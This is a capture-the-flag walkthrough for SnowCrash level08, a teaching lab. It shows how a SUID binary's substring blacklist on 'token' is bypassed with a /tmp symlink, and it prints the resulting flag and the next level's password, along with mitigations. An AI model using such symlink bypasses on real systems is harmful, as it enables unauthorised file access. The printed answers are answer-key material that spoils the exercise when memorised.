# SnowCrash Level08 Walkthrough

## Overview

Level08 presents a **path traversal/symlink bypass vulnerability** combined with a **filename blacklist check**. The target executable attempts to prevent reading a specific file (`token`) but can be bypassed using symbolic links.

## Initial Analysis

In the level08 home directory, we find two files:

```bash
level08@SnowCrash:~$ ls -all
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

- `level08`: SUID binary executable (runs as `flag08`)
- `token`: Protected file containing the flag (readable only by `flag08`)

## Binary Behavior Analysis

The program requires a filename argument:

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Attempting to read the `token` file directly fails:

```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

## Dynamic Analysis with ltrace

Using ltrace to understand the program's behavior without reverse engineering:

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

## Vulnerability Analysis

The ltrace output reveals the security mechanism:

- The program calls strstr("token", "token")
- This indicates a simple substring check for the word "token"
- The check is performed on the input string before file access

## Exploitation Strategy

### Step 1: Create Symbolic Link

Create a symbolic link with a different name pointing to the token file:

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/myToken
```

### Step 2: Execute with Symlink Path

```bash
level08@SnowCrash:~$ ./level08 /tmp/myToken
quif5eloekouj29ke0vouxean
```

## Success!

The symlink bypasses the filename check, revealing the flag: `quif5eloekouj29ke0vouxean`

## Privilege Escalation

Use the obtained password to switch to `flag08` user:

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
```

Obtain the level09 password:

```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Key Learning Points

1. **Blacklist Bypass**: Simple string matching is insufficient for security checks
2. **Symbolic Link Attacks**: Symlinks can bypass path-based security checks
3. **Path Canonicalization**: Always resolve paths to canonical form before security checks
4. **SUID Privilege Escalation**: SUID bit enables file access with elevated privileges

## Mitigation

To prevent this vulnerability:

- Use `realpath()` to resolve symbolic links
- Check file permissions directly instead of path names
- Implement whitelist approaches instead of blacklists
- Use `stat()` to check file metadata

## Next Steps

Password for Level09: `25749xKZ8L7DkSCwJkT9dyv6f`
